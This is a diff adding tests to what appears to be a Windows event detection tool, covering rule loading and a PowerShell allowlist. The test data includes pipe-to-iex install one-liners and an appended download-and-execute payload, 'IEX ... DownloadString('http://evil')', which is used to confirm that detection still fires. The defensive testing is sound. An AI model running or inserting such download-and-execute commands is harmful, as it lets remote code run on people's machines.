@@ -274,3 +274,53 @@ def test_rerun_detection_is_idempotent(db_session):
 
     assert first_ids == second_ids
     assert len(first_ids) == 1
+
+
+# --- YAML rules + allowlist ---
+
+from app.collector.windows_events import _build_script  # noqa: E402
+from app.detection.rules import RULES  # noqa: E402
+
+NPM_SHIM = """#!/usr/bin/env pwsh
+
+Set-StrictMode -Version 'Latest'
+
+$NODE_EXE="$PSScriptRoot/node.exe"
+$NPM_CLI_JS="$PSScriptRoot/node_modules/npm/bin/npm-cli.js"
+  Invoke-Expression "& `"$NODE_EXE`" `"$NPM_CLI_JS`" $NPM_ARGS"
+}
+
+exit $LASTEXITCODE
+"""
+
+
+def _scriptblock(text, minutes=0):
+    return _event(4104, minutes=minutes, channel="Microsoft-Windows-PowerShell/Operational", command_line=text)
+
+
+def test_all_yaml_rules_loaded_with_attack_tags():
+    assert len(RULES) == 9
+    assert all(r.technique_ids and 1 <= r.severity <= 10 for r in RULES)
+
+
+def test_allowlisted_installer_and_collector_scriptblocks_suppressed(db_session):
+    db_session.add(_scriptblock(NPM_SHIM))
+    db_session.add(_scriptblock("powershell -ExecutionPolicy Bypass -c 'irm https://astral.sh/uv/install.ps1 | iex'", 1))
+    db_session.add(_scriptblock("irm get.scoop.sh | iex", 2))
+    db_session.add(_scriptblock(_build_script("Security", [4625, 4688], 200), 3))
+    db_session.commit()
+
+    run_detection(db_session)
+
+    assert "Suspicious PowerShell script block" not in _rule_names(db_session)
+
+
+def test_allowlist_does_not_suppress_appended_payload(db_session):
+    db_session.add(_scriptblock("irm get.scoop.sh | iex; IEX (New-Object Net.WebClient).DownloadString('http://evil')"))
+    db_session.add(_scriptblock(NPM_SHIM + "\nIEX (New-Object Net.WebClient).DownloadString('http://evil')", 1))
+    db_session.commit()
+
+    run_detection(db_session)
+
+    detection = db_session.query(Detection).filter(Detection.rule_name == "Suspicious PowerShell script block").one()
+    assert detection.event_count == 2
